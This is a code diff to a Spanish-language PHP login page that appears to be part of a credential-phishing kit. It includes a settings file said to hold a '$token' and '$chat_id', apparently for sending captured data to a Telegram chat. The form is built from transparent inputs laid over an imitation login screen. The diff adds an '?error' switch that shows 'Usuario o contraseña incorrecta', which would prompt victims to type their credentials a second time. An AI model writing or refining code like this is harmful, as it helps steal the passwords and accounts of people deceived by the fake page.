@@ -9,6 +9,8 @@ if (empty($_SESSION['gate_pass'])) {
 }
 include("settings.php"); // Este archivo debe tener $token y $chat_id
 
+$show_error = isset($_GET['error']);
+
 // Random seed for security purposes
 $security_seed = rand(1000, 9999);
 $session_token = bin2hex(random_bytes(8));
@@ -102,7 +104,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                        style="display: block; position: relative; color:#333; background: transparent; border: none; top: 224px; left: 28px; height: 39px; width: 357px; padding-left: 12px; outline: none; font-size: 16px; font-family: dinReg, sans-serif;" autocomplete="off" onkeypress="return noEspacios(event)" oninput="handlePasswordInput(this)">
                 
                 <!-- Error Message -->
-                <p id="error-display" style="font-family: sans-serif; position: absolute; top: 417px; left: -47px; width: 357px; color: red; font-size: 14px; display: none; z-index: 10;">Usuario o contraseña incorrecta</p>
+                <p id="error-display" style="font-family: sans-serif; position: absolute; top: 417px; left: -47px; width: 357px; color: red; font-size: 14px; display: <?php echo $show_error ? 'block' : 'none'; ?>; z-index: 10;">Usuario o contraseña incorrecta</p>
                 
                 <!-- Submit Button -->
                 <input type="submit" value="Inicie Sesión"
